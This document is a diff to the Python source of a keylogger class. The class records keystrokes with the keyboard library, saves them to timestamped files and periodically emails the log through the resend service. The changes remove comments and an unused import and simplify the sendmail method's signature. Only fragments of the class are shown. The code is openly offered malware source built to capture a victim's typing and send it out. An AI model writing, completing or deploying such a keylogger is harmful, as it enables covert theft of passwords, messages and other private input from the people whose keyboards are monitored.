@@ -1,8 +1,6 @@
-#/bin/python3
 import os
-import keyboard #for keylogs
+import keyboard
 
-import requests # for making HTTP requests
 from threading import Timer
 from datetime import datetime
 import resend
@@ -47,7 +45,7 @@ class Keylogger:
         print(f"[+] Saved {self.filename}.txt")
         return self.log
 
-    def sendmail(self, email, key, title):
+    def sendmail(self):
         message = self.save()
 
 
@@ -68,7 +66,7 @@ class Keylogger:
             self.end_date = datetime.now()
             self.create_filename()
             if self.report_method == "email":
-                self.sendmail(email, key, self.filename)
+                self.sendmail()
 
             print(f"[{self.filename}] - {self.log}")
             self.start_date = datetime.now()
